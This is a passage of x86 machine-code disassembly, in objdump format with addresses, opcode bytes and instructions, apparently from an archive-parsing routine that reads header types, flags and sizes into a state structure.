  40246a:	74 0d                	je     0x402479
  40246c:	8b cf                	mov    %edi,%ecx
  40246e:	e8 88 a8 00 00       	call   0x40ccfb
  402473:	89 83 0c 23 00 00    	mov    %eax,0x230c(%ebx)
  402479:	c6 83 05 21 00 00 01 	movb   $0x1,0x2105(%ebx)
  402480:	e9 c4 03 00 00       	jmp    0x402849
  402485:	8b cf                	mov    %edi,%ecx
  402487:	e8 6f a8 00 00       	call   0x40ccfb
  40248c:	8b cf                	mov    %edi,%ecx
  40248e:	89 83 00 11 00 00    	mov    %eax,0x1100(%ebx)
  402494:	e8 62 a8 00 00       	call   0x40ccfb
  402499:	24 01                	and    $0x1,%al
  40249b:	8b cf                	mov    %edi,%ecx
  40249d:	88 83 04 21 00 00    	mov    %al,0x2104(%ebx)
  4024a3:	e8 53 a8 00 00       	call   0x40ccfb
  4024a8:	8b f0                	mov    %eax,%esi
  4024aa:	c6 84 24 bc 00 00 00 	movb   $0x0,0xbc(%esp)
  4024b1:	00 
  4024b2:	81 fe ff 1f 00 00    	cmp    $0x1fff,%esi
  4024b8:	73 18                	jae    0x4024d2
  4024ba:	56                   	push   %esi
  4024bb:	8d 84 24 c0 00 00 00 	lea    0xc0(%esp),%eax
  4024c2:	8b cf                	mov    %edi,%ecx
  4024c4:	50                   	push   %eax
  4024c5:	e8 93 a7 00 00       	call   0x40cc5d
  4024ca:	c6 84 34 bc 00 00 00 	movb   $0x0,0xbc(%esp,%esi,1)
  4024d1:	00 
  4024d2:	68 00 20 00 00       	push   $0x2000
  4024d7:	8d 84 24 c0 00 00 00 	lea    0xc0(%esp),%eax
  4024de:	50                   	push   %eax
  4024df:	50                   	push   %eax
  4024e0:	e8 50 9e 00 00       	call   0x40c335
  4024e5:	68 00 08 00 00       	push   $0x800
  4024ea:	8d 83 04 11 00 00    	lea    0x1104(%ebx),%eax
  4024f0:	50                   	push   %eax
  4024f1:	8d 84 24 c4 00 00 00 	lea    0xc4(%esp),%eax
  4024f8:	50                   	push   %eax
  4024f9:	e8 3d f7 00 00       	call   0x411c3b
  4024fe:	e9 46 03 00 00       	jmp    0x402849
  402503:	83 f9 01             	cmp    $0x1,%ecx
  402506:	0f 82 3d 03 00 00    	jb     0x402849
  40250c:	8b cf                	mov    %edi,%ecx
  40250e:	e8 e8 a7 00 00       	call   0x40ccfb
  402513:	8b cf                	mov    %edi,%ecx
  402515:	e8 e1 a7 00 00       	call   0x40ccfb
  40251a:	85 c0                	test   %eax,%eax
  40251c:	0f 84 27 03 00 00    	je     0x402849
  402522:	50                   	push   %eax
  402523:	68 b4 36 43 00       	push   $0x4336b4
  402528:	8d 44 24 34          	lea    0x34(%esp),%eax
  40252c:	c6 83 f3 10 00 00 01 	movb   $0x1,0x10f3(%ebx)
  402533:	6a 14                	push   $0x14
  402535:	50                   	push   %eax
  402536:	e8 57 1b 00 00       	call   0x404092
  40253b:	83 c4 10             	add    $0x10,%esp
  40253e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  402542:	68 00 08 00 00       	push   $0x800
  402547:	50                   	push   %eax
  402548:	8d 43 28             	lea    0x28(%ebx),%eax
  40254b:	50                   	push   %eax
  40254c:	e8 89 e0 00 00       	call   0x4105da
  402551:	e9 f3 02 00 00       	jmp    0x402849
  402556:	83 f9 05             	cmp    $0x5,%ecx
  402559:	0f 82 ea 02 00 00    	jb     0x402849
  40255f:	8b cf                	mov    %edi,%ecx
  402561:	e8 95 a7 00 00       	call   0x40ccfb
  402566:	88 44 24 13          	mov    %al,0x13(%esp)
  40256a:	24 01                	and    $0x1,%al
  40256c:	8a 4c 24 13          	mov    0x13(%esp),%cl
  402570:	8a d1                	mov    %cl,%dl
  402572:	88 44 24 14          	mov    %al,0x14(%esp)
  402576:	80 e2 02             	and    $0x2,%dl
  402579:	88 54 24 15          	mov    %dl,0x15(%esp)
  40257d:	74 35                	je     0x4025b4
  40257f:	8b cf                	mov    %edi,%ecx
  402581:	84 c0                	test   %al,%al
  402583:	74 15                	je     0x40259a
  402585:	e8 71 a6 00 00       	call   0x40cbfb
  40258a:	6a 00                	push   $0x0
  40258c:	50                   	push   %eax
  40258d:	8d 8b 40 10 00 00    	lea    0x1040(%ebx),%ecx
  402593:	e8 f7 ef 00 00       	call   0x41158f
  402598:	eb 12                	jmp    0x4025ac
  40259a:	e8 9e a6 00 00       	call   0x40cc3d
  40259f:	52                   	push   %edx
  4025a0:	50                   	push   %eax
  4025a1:	8d 8b 40 10 00 00    	lea    0x1040(%ebx),%ecx
  4025a7:	e8 0f f0 00 00       	call   0x4115bb
  4025ac:	8a 4c 24 13          	mov    0x13(%esp),%cl
  4025b0:	8a 44 24 14          	mov    0x14(%esp),%al
  4025b4:	80 e1 04             	and    $0x4,%cl
  4025b7:	88 4c 24 16          	mov    %cl,0x16(%esp)
  4025bb:	74 2b                	je     0x4025e8
  4025bd:	8d b3 48 10 00 00    	lea    0x1048(%ebx),%esi
  4025c3:	8b cf                	mov    %edi,%ecx
  4025c5:	84 c0                	test   %al,%al
  4025c7:	74 11                	je     0x4025da
  4025c9:	e8 2d a6 00 00       	call   0x40cbfb
  4025ce:	6a 00                	push   $0x0
  4025d0:	50                   	push   %eax
  4025d1:	8b ce                	mov    %esi,%ecx
  4025d3:	e8 b7 ef 00 00       	call   0x41158f
  4025d8:	eb 0e                	jmp    0x4025e8
  4025da:	e8 5e a6 00 00       	call   0x40cc3d
  4025df:	52                   	push   %edx
  4025e0:	50                   	push   %eax
  4025e1:	8b ce                	mov    %esi,%ecx
  4025e3:	e8 d3 ef 00 00       	call   0x4115bb
  4025e8:	8a 44 24 13          	mov    0x13(%esp),%al
  4025ec:	8a c8                	mov    %al,%cl
  4025ee:	80 e1 08             	and    $0x8,%cl
  4025f1:	88 4c 24 17          	mov    %cl,0x17(%esp)
  4025f5:	74 37                	je     0x40262e
  4025f7:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
  4025fc:	8d b3 50 10 00 00    	lea    0x1050(%ebx),%esi
  402602:	8b cf                	mov    %edi,%ecx
  402604:	74 15                	je     0x40261b
  402606:	e8 f0 a5 00 00       	call   0x40cbfb
  40260b:	6a 00                	push   $0x0
  40260d:	50                   	push   %eax
  40260e:	8b ce                	mov    %esi,%ecx
  402610:	e8 7a ef 00 00       	call   0x41158f
  402615:	8a 44 24 13          	mov    0x13(%esp),%al
  402619:	eb 1e                	jmp    0x402639
  40261b:	e8 1d a6 00 00       	call   0x40cc3d
  402620:	52                   	push   %edx
  402621:	50                   	push   %eax
  402622:	8b ce                	mov    %esi,%ecx
  402624:	e8 92 ef 00 00       	call   0x4115bb
  402629:	e9 1b 02 00 00       	jmp    0x402849
  40262e:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
  402633:	0f 84 10 02 00 00    	je     0x402849
  402639:	a8 10                	test   $0x10,%al
  40263b:	0f 84 08 02 00 00    	je     0x402849
  402641:	80 7c 24 15 00       	cmpb   $0x0,0x15(%esp)
  402646:	74 27                	je     0x40266f
  402648:	8b cf                	mov    %edi,%ecx
  40264a:	e8 ac a5 00 00       	call   0x40cbfb
  40264f:	bd ff ff ff 3f       	mov    $0x3fffffff,%ebp
  402654:	be 00 ca 9a 3b       	mov    $0x3b9aca00,%esi
  402659:	23 c5                	and    %ebp,%eax
  40265b:	3b c6                	cmp    %esi,%eax
  40265d:	73 1a                	jae    0x402679
  40265f:	6a 00                	push   $0x0
  402661:	50                   	push   %eax
  402662:	8d 8b 40 10 00 00    	lea    0x1040(%ebx),%ecx
  402668:	e8 9b eb 00 00       	call   0x411208
  40266d:	eb 0a                	jmp    0x402679
  40266f:	bd ff ff ff 3f       	mov    $0x3fffffff,%ebp
  402674:	be 00 ca 9a 3b       	mov    $0x3b9aca00,%esi
  402679:	80 7c 24 16 00       	cmpb   $0x0,0x16(%esp)
  40267e:	74 1b                	je     0x40269b
  402680:	8b cf                	mov    %edi,%ecx
  402682:	e8 74 a5 00 00       	call   0x40cbfb
  402687:	23 c5                	and    %ebp,%eax
  402689:	3b c6                	cmp    %esi,%eax
  40268b:	73 0e                	jae    0x40269b
  40268d:	6a 00                	push   $0x0
  40268f:	50                   	push   %eax
  402690:	8d 8b 48 10 00 00    	lea    0x1048(%ebx),%ecx
  402696:	e8 6d eb 00 00       	call   0x411208
  40269b:	80 7c 24 17 00       	cmpb   $0x0,0x17(%esp)
  4026a0:	0f 84 a3 01 00 00    	je     0x402849
  4026a6:	8b cf                	mov    %edi,%ecx
  4026a8:	e8 4e a5 00 00       	call   0x40cbfb
  4026ad:	23 c5                	and    %ebp,%eax
  4026af:	3b c6                	cmp    %esi,%eax
  4026b1:	0f 83 92 01 00 00    	jae    0x402849
  4026b7:	6a 00                	push   $0x0
  4026b9:	50                   	push   %eax
  4026ba:	8d 8b 50 10 00 00    	lea    0x1050(%ebx),%ecx
  4026c0:	e8 43 eb 00 00       	call   0x411208
  4026c5:	e9 7f 01 00 00       	jmp    0x402849
  4026ca:	8b cf                	mov    %edi,%ecx
  4026cc:	e8 2a a6 00 00       	call   0x40ccfb
  4026d1:	85 c0                	test   %eax,%eax
  4026d3:	0f 85 70 01 00 00    	jne    0x402849
  4026d9:	6a 20                	push   $0x20
  4026db:	8d 83 74 10 00 00    	lea    0x1074(%ebx),%eax
  4026e1:	c7 83 70 10 00 00 03 	movl   $0x3,0x1070(%ebx)
  4026e8:	00 00 00 
  4026eb:	50                   	push   %eax
  4026ec:	e9 bc fc ff ff       	jmp    0x4023ad
  4026f1:	8b cf                	mov    %edi,%ecx
  4026f3:	e8 03 a6 00 00       	call   0x40ccfb
  4026f8:	85 c0                	test   %eax,%eax
  4026fa:	74 2c                	je     0x402728
  4026fc:	50                   	push   %eax
  4026fd:	68 94 36 43 00       	push   $0x433694
  402702:	8d 44 24 34          	lea    0x34(%esp),%eax
  402706:	6a 14                	push   $0x14
  402708:	50                   	push   %eax
  402709:	e8 84 19 00 00       	call   0x404092
  40270e:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402712:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402716:	83 c4 10             	add    $0x10,%esp
  402719:	50                   	push   %eax
  40271a:	8d 43 28             	lea    0x28(%ebx),%eax
  40271d:	50                   	push   %eax
  40271e:	e8 1a 19 00 00       	call   0x40403d
  402723:	e9 21 01 00 00       	jmp    0x402849
  402728:	8b cf                	mov    %edi,%ecx
  40272a:	e8 cc a5 00 00       	call   0x40ccfb
  40272f:	8a c8                	mov    %al,%cl
  402731:	d1 e8                	shr    $1,%eax
  402733:	80 e1 01             	and    $0x1,%cl
  402736:	24 01                	and    $0x1,%al
  402738:	88 8b c1 10 00 00    	mov    %cl,0x10c1(%ebx)
  40273e:	8b cf                	mov    %edi,%ecx
  402740:	88 83 ca 10 00 00    	mov    %al,0x10ca(%ebx)
  402746:	e8 64 a4 00 00       	call   0x40cbaf
  40274b:	0f b6 c0             	movzbl %al,%eax
  40274e:	89 83 ec 10 00 00    	mov    %eax,0x10ec(%ebx)
  402754:	83 f8 18             	cmp    $0x18,%eax
  402757:	76 27                	jbe    0x402780
  402759:	50                   	push   %eax
  40275a:	68 9c 36 43 00       	push   $0x43369c
  40275f:	8d 44 24 34          	lea    0x34(%esp),%eax
  402763:	6a 14                	push   $0x14
  402765:	50                   	push   %eax
  402766:	e8 27 19 00 00       	call   0x404092
  40276b:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40276f:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402773:	83 c4 10             	add    $0x10,%esp
  402776:	50                   	push   %eax
  402777:	8d 43 28             	lea    0x28(%ebx),%eax
  40277a:	50                   	push   %eax
  40277b:	e8 bd 18 00 00       	call   0x40403d
  402780:	6a 10                	push   $0x10
  402782:	8d 83 a1 10 00 00    	lea    0x10a1(%ebx),%eax
  402788:	8b cf                	mov    %edi,%ecx
  40278a:	50                   	push   %eax
  40278b:	e8 cd a4 00 00       	call   0x40cc5d
  402790:	6a 10                	push   $0x10
  402792:	8d 83 b1 10 00 00    	lea    0x10b1(%ebx),%eax
  402798:	8b cf                	mov    %edi,%ecx
  40279a:	50                   	push   %eax
  40279b:	e8 bd a4 00 00       	call   0x40cc5d
  4027a0:	80 bb c1 10 00 00 00 	cmpb   $0x0,0x10c1(%ebx)
  4027a7:	0f 84 84 00 00 00    	je     0x402831
  4027ad:	6a 08                	push   $0x8
  4027af:	8d b3 c2 10 00 00    	lea    0x10c2(%ebx),%esi
  4027b5:	8b cf                	mov    %edi,%ecx
  4027b7:	56                   	push   %esi
  4027b8:	e8 a0 a4 00 00       	call   0x40cc5d
  4027bd:	6a 04                	push   $0x4
  4027bf:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4027c3:	8b cf                	mov    %edi,%ecx
  4027c5:	50                   	push   %eax
  4027c6:	e8 92 a4 00 00       	call   0x40cc5d
  4027cb:	8d 44 24 54          	lea    0x54(%esp),%eax
  4027cf:	50                   	push   %eax
  4027d0:	e8 41 d8 00 00       	call   0x410016
  4027d5:	6a 08                	push   $0x8
  4027d7:	56                   	push   %esi
  4027d8:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  4027dc:	50                   	push   %eax
  4027dd:	e8 7a d8 00 00       	call   0x41005c
  4027e2:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4027e6:	50                   	push   %eax
  4027e7:	8d 44 24 58          	lea    0x58(%esp),%eax
  4027eb:	50                   	push   %eax
  4027ec:	e8 42 d7 00 00       	call   0x40ff33
  4027f1:	6a 04                	push   $0x4
  4027f3:	8d 44 24 30          	lea    0x30(%esp),%eax
  4027f7:	50                   	push   %eax
  4027f8:	8d 44 24 30          	lea    0x30(%esp),%eax
  4027fc:	50                   	push   %eax
  4027fd:	e8 48 e4 01 00       	call   0x420c4a
  402802:	83 c4 0c             	add    $0xc,%esp
  402805:	f7 d8                	neg    %eax
  402807:	1a c0                	sbb    %al,%al
  402809:	fe c0                	inc    %al
  40280b:	83 7b 04 03          	cmpl   $0x3,0x4(%ebx)
  40280f:	88 83 c1 10 00 00    	mov    %al,0x10c1(%ebx)
  402815:	75 1a                	jne    0x402831
  402817:	6a 08                	push   $0x8
  402819:	68 a8 36 43 00       	push   $0x4336a8
  40281e:	56                   	push   %esi
  40281f:	e8 26 e4 01 00       	call   0x420c4a
  402824:	83 c4 0c             	add    $0xc,%esp
  402827:	85 c0                	test   %eax,%eax
  402829:	75 06                	jne    0x402831
  40282b:	88 83 c1 10 00 00    	mov    %al,0x10c1(%ebx)
  402831:	c6 83 a0 10 00 00 01 	movb   $0x1,0x10a0(%ebx)
  402838:	c7 83 9c 10 00 00 05 	movl   $0x5,0x109c(%ebx)
  40283f:	00 00 00 
  402842:	c6 83 9b 10 00 00 01 	movb   $0x1,0x109b(%ebx)
  402849:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40284d:	89 4f 1c             	mov    %ecx,0x1c(%edi)
  402850:	8b 47 18             	mov    0x18(%edi),%eax
  402853:	2b c1                	sub    %ecx,%eax
  402855:	83 f8 02             	cmp    $0x2,%eax
  402858:	0f 83 f6 f9 ff ff    	jae    0x402254
  40285e:	5e                   	pop    %esi
  40285f:	5d                   	pop    %ebp
  402860:	5b                   	pop    %ebx
  402861:	5f                   	pop    %edi
  402862:	81 c4 ac 20 00 00    	add    $0x20ac,%esp
  402868:	c2 0c 00             	ret    $0xc
  40286b:	55                   	push   %ebp
  40286c:	83 ec 58             	sub    $0x58,%esp
  40286f:	b8 a5 26 43 00       	mov    $0x4326a5,%eax
  402874:	e8 ff c2 01 00       	call   0x41eb78
  402879:	b8 24 20 00 00       	mov    $0x2024,%eax
  40287e:	e8 cd c3 01 00       	call   0x41ec50
  402883:	53                   	push   %ebx
  402884:	56                   	push   %esi
  402885:	8b d9                	mov    %ecx,%ebx
  402887:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40288a:	57                   	push   %edi
  40288b:	53                   	push   %ebx
  40288c:	89 5d 14             	mov    %ebx,0x14(%ebp)
  40288f:	e8 ef a2 00 00       	call   0x40cb83
  402894:	33 c9                	xor    %ecx,%ecx
  402896:	6a 07                	push   $0x7
  402898:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40289b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40289e:	5f                   	pop    %edi
  40289f:	38 8b d4 6c 00 00    	cmp    %cl,0x6cd4(%ebx)
  4028a5:	74 7c                	je     0x402923
  4028a7:	8b 93 d8 6c 00 00    	mov    0x6cd8(%ebx),%edx
  4028ad:	33 c0                	xor    %eax,%eax
  4028af:	03 d7                	add    %edi,%edx
  4028b1:	13 c1                	adc    %ecx,%eax
  4028b3:	39 83 bc 6c 00 00    	cmp    %eax,0x6cbc(%ebx)
  4028b9:	7c 68                	jl     0x402923
  4028bb:	7f 08                	jg     0x4028c5
  4028bd:	39 93 b8 6c 00 00    	cmp    %edx,0x6cb8(%ebx)
  4028c3:	76 5e                	jbe    0x402923
  4028c5:	8b cb                	mov    %ebx,%ecx
  4028c7:	c6 45 5a 01          	movb   $0x1,0x5a(%ebp)
  4028cb:	e8 9d 15 00 00       	call   0x403e6d
  4028d0:	8b 03                	mov    (%ebx),%eax
  4028d2:	8d 4d 40             	lea    0x40(%ebp),%ecx
  4028d5:	6a 08                	push   $0x8
  4028d7:	51                   	push   %ecx
  4028d8:	8b 70 0c             	mov    0xc(%eax),%esi
  4028db:	8b ce                	mov    %esi,%ecx
  4028dd:	ff 15 78 32 43 00    	call   *0x433278
  4028e3:	8b cb                	mov    %ebx,%ecx
  4028e5:	ff d6                	call   *%esi
  4028e7:	83 f8 08             	cmp    $0x8,%eax
  4028ea:	74 0c                	je     0x4028f8
  4028ec:	8b cb                	mov    %ebx,%ecx
  4028ee:	e8 09 17 00 00       	call   0x403ffc
  4028f3:	e9 e2 09 00 00       	jmp    0x4032da
  4028f8:	33 c9                	xor    %ecx,%ecx
  4028fa:	8d 45 40             	lea    0x40(%ebp),%eax
  4028fd:	51                   	push   %ecx
  4028fe:	51                   	push   %ecx
  4028ff:	51                   	push   %ecx
  402900:	51                   	push   %ecx
  402901:	50                   	push   %eax
  402902:	8b 83 d4 21 00 00    	mov    0x21d4(%ebx),%eax
  402908:	8d b3 38 10 00 00    	lea    0x1038(%ebx),%esi
  40290e:	05 24 60 00 00       	add    $0x6024,%eax
  402913:	50                   	push   %eax
  402914:	6a 04                	push   $0x4
  402916:	51                   	push   %ecx
  402917:	8b ce                	mov    %esi,%ecx
  402919:	e8 1c 37 00 00       	call   0x40603a
  40291e:	89 75 3c             	mov    %esi,0x3c(%ebp)
  402921:	eb 03                	jmp    0x402926
  402923:	88 4d 5a             	mov    %cl,0x5a(%ebp)
  402926:	57                   	push   %edi
  402927:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40292a:	e8 5b a4 00 00       	call   0x40cd8a
  40292f:	83 7d 34 00          	cmpl   $0x0,0x34(%ebp)
  402933:	74 b7                	je     0x4028ec
  402935:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402938:	e8 89 a2 00 00       	call   0x40cbc6
  40293d:	0f b7 c0             	movzwl %ax,%eax
  402940:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402943:	89 83 fc 21 00 00    	mov    %eax,0x21fc(%ebx)
  402949:	c6 83 0c 22 00 00 00 	movb   $0x0,0x220c(%ebx)
  402950:	e8 5a a2 00 00       	call   0x40cbaf
  402955:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402958:	0f b6 f0             	movzbl %al,%esi
  40295b:	e8 66 a2 00 00       	call   0x40cbc6
  402960:	0f b7 c0             	movzwl %ax,%eax
  402963:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402966:	89 83 04 22 00 00    	mov    %eax,0x2204(%ebx)
  40296c:	c1 e8 0e             	shr    $0xe,%eax
  40296f:	24 01                	and    $0x1,%al
  402971:	88 83 0c 22 00 00    	mov    %al,0x220c(%ebx)
  402977:	e8 4a a2 00 00       	call   0x40cbc6
  40297c:	0f b7 c8             	movzwl %ax,%ecx
  40297f:	89 8b 08 22 00 00    	mov    %ecx,0x2208(%ebx)
  402985:	89 b3 00 22 00 00    	mov    %esi,0x2200(%ebx)
  40298b:	3b cf                	cmp    %edi,%ecx
  40298d:	73 0c                	jae    0x40299b
  40298f:	8b cb                	mov    %ebx,%ecx
  402991:	e8 41 f7 ff ff       	call   0x4020d7
  402996:	e9 3f 09 00 00       	jmp    0x4032da
  40299b:	8b c6                	mov    %esi,%eax
  40299d:	6a 02                	push   $0x2
  40299f:	5a                   	pop    %edx
  4029a0:	83 e8 73             	sub    $0x73,%eax
  4029a3:	74 2a                	je     0x4029cf
  4029a5:	83 e8 01             	sub    $0x1,%eax
  4029a8:	74 1b                	je     0x4029c5
  4029aa:	83 e8 06             	sub    $0x6,%eax
  4029ad:	74 09                	je     0x4029b8
  4029af:	83 e8 01             	sub    $0x1,%eax
  4029b2:	75 28                	jne    0x4029dc
  4029b4:	6a 05                	push   $0x5
  4029b6:	eb 02                	jmp    0x4029ba
  4029b8:	6a 03                	push   $0x3
  4029ba:	58                   	pop    %eax
  4029bb:	89 83 00 22 00 00    	mov    %eax,0x2200(%ebx)
  4029c1:	8b f0                	mov    %eax,%esi
  4029c3:	eb 17                	jmp    0x4029dc
  4029c5:	89 93 00 22 00 00    	mov    %edx,0x2200(%ebx)
  4029cb:	8b f2                	mov    %edx,%esi
  4029cd:	eb 0d                	jmp    0x4029dc
  4029cf:	33 f6                	xor    %esi,%esi
  4029d1:	c7 83 00 22 00 00 01 	movl   $0x1,0x2200(%ebx)
  4029d8:	00 00 00 
  4029db:	46                   	inc    %esi
  4029dc:	89 b3 f4 21 00 00    	mov    %esi,0x21f4(%ebx)
  4029e2:	83 fe 75             	cmp    $0x75,%esi
  4029e5:	74 0e                	je     0x4029f5
  4029e7:	83 fe 01             	cmp    $0x1,%esi
  4029ea:	75 0e                	jne    0x4029fa
  4029ec:	f6 83 04 22 00 00 02 	testb  $0x2,0x2204(%ebx)
  4029f3:	74 05                	je     0x4029fa
  4029f5:	6a 06                	push   $0x6
  4029f7:	58                   	pop    %eax
  4029f8:	eb 03                	jmp    0x4029fd
  4029fa:	8d 41 f9             	lea    -0x7(%ecx),%eax
  4029fd:	50                   	push   %eax
  4029fe:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402a01:	e8 84 a3 00 00       	call   0x40cd8a
  402a06:	ff b3 08 22 00 00    	push   0x2208(%ebx)
  402a0c:	8b cb                	mov    %ebx,%ecx
  402a0e:	e8 70 ef ff ff       	call   0x401983
  402a13:	03 83 b8 6c 00 00    	add    0x6cb8(%ebx),%eax
  402a19:	8b 8b bc 6c 00 00    	mov    0x6cbc(%ebx),%ecx
  402a1f:	83 d1 00             	adc    $0x0,%ecx
  402a22:	89 83 c0 6c 00 00    	mov    %eax,0x6cc0(%ebx)
  402a28:	89 8b c4 6c 00 00    	mov    %ecx,0x6cc4(%ebx)
  402a2e:	8b 8b 00 22 00 00    	mov    0x2200(%ebx),%ecx
  402a34:	8b c1                	mov    %ecx,%eax
  402a36:	89 4d 18             	mov    %ecx,0x18(%ebp)
  402a39:	83 e8 01             	sub    $0x1,%eax
  402a3c:	0f 84 17 07 00 00    	je     0x403159
  402a42:	83 e8 01             	sub    $0x1,%eax
  402a45:	0f 84 bf 00 00 00    	je     0x402b0a
  402a4b:	83 e8 01             	sub    $0x1,%eax
  402a4e:	0f 84 b6 00 00 00    	je     0x402b0a
  402a54:	48                   	dec    %eax
  402a55:	83 e8 01             	sub    $0x1,%eax
  402a58:	74 2a                	je     0x402a84
  402a5a:	f7 83 04 22 00 00 00 	testl  $0x8000,0x2204(%ebx)
  402a61:	80 00 00 
  402a64:	0f 84 b3 07 00 00    	je     0x40321d
  402a6a:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402a6d:	e8 89 a1 00 00       	call   0x40cbfb
  402a72:	01 83 c0 6c 00 00    	add    %eax,0x6cc0(%ebx)
  402a78:	83 93 c4 6c 00 00 00 	adcl   $0x0,0x6cc4(%ebx)
  402a7f:	e9 99 07 00 00       	jmp    0x40321d
  402a84:	6a 05                	push   $0x5
  402a86:	8d bb a8 45 00 00    	lea    0x45a8(%ebx),%edi
  402a8c:	59                   	pop    %ecx
  402a8d:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  402a93:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402a95:	8a 83 b0 45 00 00    	mov    0x45b0(%ebx),%al
  402a9b:	8b 93 b0 45 00 00    	mov    0x45b0(%ebx),%edx
  402aa1:	24 01                	and    $0x1,%al
  402aa3:	88 83 c4 45 00 00    	mov    %al,0x45c4(%ebx)
  402aa9:	8b ca                	mov    %edx,%ecx
  402aab:	8b c2                	mov    %edx,%eax
  402aad:	d1 e9                	shr    $1,%ecx
  402aaf:	c1 e8 02             	shr    $0x2,%eax
  402ab2:	80 e1 01             	and    $0x1,%cl
  402ab5:	c1 ea 03             	shr    $0x3,%edx
  402ab8:	24 01                	and    $0x1,%al
  402aba:	80 e2 01             	and    $0x1,%dl
  402abd:	88 8b c5 45 00 00    	mov    %cl,0x45c5(%ebx)
  402ac3:	88 83 c6 45 00 00    	mov    %al,0x45c6(%ebx)
  402ac9:	88 93 c7 45 00 00    	mov    %dl,0x45c7(%ebx)
  402acf:	84 c9                	test   %cl,%cl
  402ad1:	74 0e                	je     0x402ae1
  402ad3:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402ad6:	e8 20 a1 00 00       	call   0x40cbfb
  402adb:	89 83 bc 45 00 00    	mov    %eax,0x45bc(%ebx)
  402ae1:	80 bb c7 45 00 00 00 	cmpb   $0x0,0x45c7(%ebx)
  402ae8:	0f 84 2c 07 00 00    	je     0x40321a
  402aee:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402af1:	e8 d0 a0 00 00       	call   0x40cbc6
  402af6:	0f b7 c0             	movzwl %ax,%eax
  402af9:	89 83 c0 45 00 00    	mov    %eax,0x45c0(%ebx)
  402aff:	89 83 f0 6c 00 00    	mov    %eax,0x6cf0(%ebx)
  402b05:	e9 10 07 00 00       	jmp    0x40321a
  402b0a:	33 c0                	xor    %eax,%eax
  402b0c:	83 f9 02             	cmp    $0x2,%ecx
  402b0f:	6a 00                	push   $0x0
  402b11:	0f 94 c0             	sete   %al
  402b14:	8d 78 ff             	lea    -0x1(%eax),%edi
  402b17:	81 e7 50 23 00 00    	and    $0x2350,%edi
  402b1d:	81 c7 98 22 00 00    	add    $0x2298,%edi
  402b23:	03 fb                	add    %ebx,%edi
  402b25:	8b cf                	mov    %edi,%ecx
  402b27:	89 7d 4c             	mov    %edi,0x4c(%ebp)
  402b2a:	e8 95 81 00 00       	call   0x40acc4
  402b2f:	6a 05                	push   $0x5
  402b31:	59                   	pop    %ecx
  402b32:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  402b38:	33 d2                	xor    %edx,%edx
  402b3a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402b3c:	8b 75 4c             	mov    0x4c(%ebp),%esi
  402b3f:	42                   	inc    %edx
  402b40:	8b 7d 18             	mov    0x18(%ebp),%edi
  402b43:	8a 46 08             	mov    0x8(%esi),%al
  402b46:	8b 4e 08             	mov    0x8(%esi),%ecx
  402b49:	22 c2                	and    %dl,%al
  402b4b:	88 86 98 10 00 00    	mov    %al,0x1098(%esi)
  402b51:	8b c1                	mov    %ecx,%eax
  402b53:	d1 e8                	shr    $1,%eax
  402b55:	22 c2                	and    %dl,%al
  402b57:	88 86 99 10 00 00    	mov    %al,0x1099(%esi)
  402b5d:	8b c1                	mov    %ecx,%eax
  402b5f:	c1 e8 02             	shr    $0x2,%eax
  402b62:	22 c2                	and    %dl,%al
  402b64:	88 86 9b 10 00 00    	mov    %al,0x109b(%esi)
  402b6a:	8b c1                	mov    %ecx,%eax
  402b6c:	c1 e8 0a             	shr    $0xa,%eax
  402b6f:	22 c2                	and    %dl,%al
  402b71:	88 86 a0 10 00 00    	mov    %al,0x10a0(%esi)
  402b77:	8b c1                	mov    %ecx,%eax
  402b79:	83 e0 10             	and    $0x10,%eax
  402b7c:	83 ff 02             	cmp    $0x2,%edi
  402b7f:	75 0b                	jne    0x402b8c
  402b81:	85 c0                	test   %eax,%eax
  402b83:	74 07                	je     0x402b8c
  402b85:	88 55 5b             	mov    %dl,0x5b(%ebp)
  402b88:	33 d2                	xor    %edx,%edx
  402b8a:	eb 05                	jmp    0x402b91
  402b8c:	33 d2                	xor    %edx,%edx
  402b8e:	88 55 5b             	mov    %dl,0x5b(%ebp)
  402b91:	8a 5d 5b             	mov    0x5b(%ebp),%bl
  402b94:	88 9e f0 10 00 00    	mov    %bl,0x10f0(%esi)
  402b9a:	8b 5d 14             	mov    0x14(%ebp),%ebx
  402b9d:	83 ff 02             	cmp    $0x2,%edi
  402ba0:	74 06                	je     0x402ba8
  402ba2:	85 c0                	test   %eax,%eax
  402ba4:	b0 01                	mov    $0x1,%al
  402ba6:	75 02                	jne    0x402baa
  402ba8:	8a c2                	mov    %dl,%al
  402baa:	88 86 fa 10 00 00    	mov    %al,0x10fa(%esi)
  402bb0:	b8 e0 00 00 00       	mov    $0xe0,%eax
  402bb5:	23 c8                	and    %eax,%ecx
  402bb7:	3b c8                	cmp    %eax,%ecx
  402bb9:	0f 94 c0             	sete   %al
  402bbc:	88 86 f1 10 00 00    	mov    %al,0x10f1(%esi)
  402bc2:	81 f9 e0 00 00 00    	cmp    $0xe0,%ecx
  402bc8:	75 07                	jne    0x402bd1
  402bca:	8b c2                	mov    %edx,%eax
  402bcc:	8b 56 08             	mov    0x8(%esi),%edx
  402bcf:	eb 12                	jmp    0x402be3
